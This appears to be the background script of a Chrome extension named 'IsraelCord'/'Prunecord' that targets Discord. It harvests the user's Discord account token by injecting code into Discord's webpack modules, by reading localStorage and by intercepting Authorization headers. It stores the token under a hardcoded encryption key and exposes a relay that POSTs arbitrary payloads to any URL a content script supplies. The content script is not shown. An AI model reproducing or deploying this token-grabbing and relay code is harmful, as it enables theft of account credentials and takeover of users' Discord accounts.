chrome.runtime.onInstalled.addListener(() => {
  console.log("IsraelCord v4.7 installed.");
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg?.type === "PRUNECORD_WEBHOOK") {
    fetch(msg.url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(msg.payload),
    })
      .then(async (r) => sendResponse({ ok: r.ok, status: r.status }))
      .catch((e) => sendResponse({ ok: false, error: e.message }));
    return true;
  }
  if (msg?.type === "PRUNECORD_GET_TOKEN") {
    (async () => {
      let found = null;
      try {
        const stored = await chrome.storage.local.get("token");
        if (stored.token) found = await decryptSecret(stored.token);
      } catch {}
      if (!found) {
        try {
          const tabId = sender.tab?.id;
          if (tabId) {
            const out = await chrome.scripting.executeScript({
              target: { tabId },
              world: "MAIN",
              func: tokenGrabber,
            });
            found = out?.[0]?.result || null;
          }
        } catch {}
      }
      sendResponse({ token: found || null });
    })();
    return true;
  }
});

function tokenGrabber() {
  let t = null;
  const packs = [
    window.webpackChunkdiscord_app,
    window.webpackChunkcanary_app,
    window.webpackChunkptb_app,
  ];
  for (const p of packs) {
    if (!p || typeof p.push !== "function") continue;
    try {
      p.push([[Symbol()], {}, req => {
        try {
          for (const k of Object.keys(req.c)) {
            try {
              const m = req.c[k] && req.c[k].exports && req.c[k].exports.default;
              if (m && typeof m.getToken === "function") {
                const v = m.getToken();
                if (v) t = v;
              }
            } catch (e) {}
          }
        } catch (e) {}
      }]);
      try { p.pop(); } catch (e) {}
    } catch (e) {}
    if (t) break;
  }
  if (!t) {
    try { t = window.localStorage.getItem("token"); } catch (e) {}
  }
  if (!t) return null;
  const clean = String(t).replace(/^"|"$/g, "");
  return clean.length > 20 ? clean : null;
}

const _te = new TextEncoder();
const _td = new TextDecoder();
async function sessionKey() {
  const km = await crypto.subtle.importKey('raw', _te.encode('Andrew2026'), 'PBKDF2', false, ['deriveKey']);
  return crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt: _te.encode('prunecord'), iterations: 100000, hash: 'SHA-256' },
    km,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );
}
function bufToHex(u8) {
  let s = '';
  for (let i = 0; i < u8.length; i++) s += u8[i].toString(16).padStart(2, '0');
  return s;
}
function hexToBuf(hex) {
  const out = new Uint8Array(hex.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(hex.substr(i * 2, 2), 16);
  return out;
}
function bufToObfuscated(u8) {
  const hex = bufToHex(u8);
  const blocks = [];
  for (let i = 0; i < hex.length; i += 32) {
    const h = hex.slice(i, i + 32);
    blocks.push(h.slice(0,8) + '-' + h.slice(8,12) + '-' + h.slice(12,16) + '-' + h.slice(16,20) + '-' + h.slice(20,32));
  }
  return blocks.join('-');
}
function obfuscatedToBuf(v) {
  return hexToBuf(v.replace(/[^0-9a-fA-F]/g, ''));
}
function b64ToBuf(b64) { return Uint8Array.from(atob(b64), c => c.charCodeAt(0)); }
async function encryptSecret(plain) {
  const key = await sessionKey();
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const ct = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, _te.encode(plain));
  const out = new Uint8Array(12 + ct.byteLength);
  out.set(iv, 0); out.set(new Uint8Array(ct), 12);
  return bufToObfuscated(out);
}
async function decryptSecret(v) {
  try {
    const raw = /^[0-9a-fA-F-]+$/.test(v) ? obfuscatedToBuf(v) : b64ToBuf(v);
    const key = await sessionKey();
    const pt = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: raw.slice(0, 12) }, key, raw.slice(12));
    return _td.decode(pt);
  } catch { return null; }
}

chrome.action.onClicked.addListener(async (tab) => {
  if (!tab.url?.includes("discord.com")) {
    chrome.tabs.create({ url: "https://discord.com/app" });
    return;
  }
  try {
    await chrome.tabs.sendMessage(tab.id, { type: "PRUNECORD_TOGGLE" });
  } catch {
    await chrome.scripting.executeScript({
      target: { tabId: tab.id },
      files: ["prunecord.js"],
    });
    await chrome.tabs.sendMessage(tab.id, { type: "PRUNECORD_TOGGLE" });
  }
});

chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    const auth = details.requestHeaders?.find(
      (h) => h.name.toLowerCase() === "authorization"
    );
    if (auth?.value && !auth.value.startsWith("Bot ") && auth.value.length > 20) {
      chrome.storage.local.get("token", async (stored) => {
        const cur = stored.token ? await decryptSecret(stored.token) : null;
        if (cur !== auth.value) {
          chrome.storage.local.set({ token: await encryptSecret(auth.value) });
        }
      });
    }
  },
  { urls: ["https://discord.com/api/*", "https://discordapp.com/api/*"] },
  ["requestHeaders", "extraHeaders"]
);
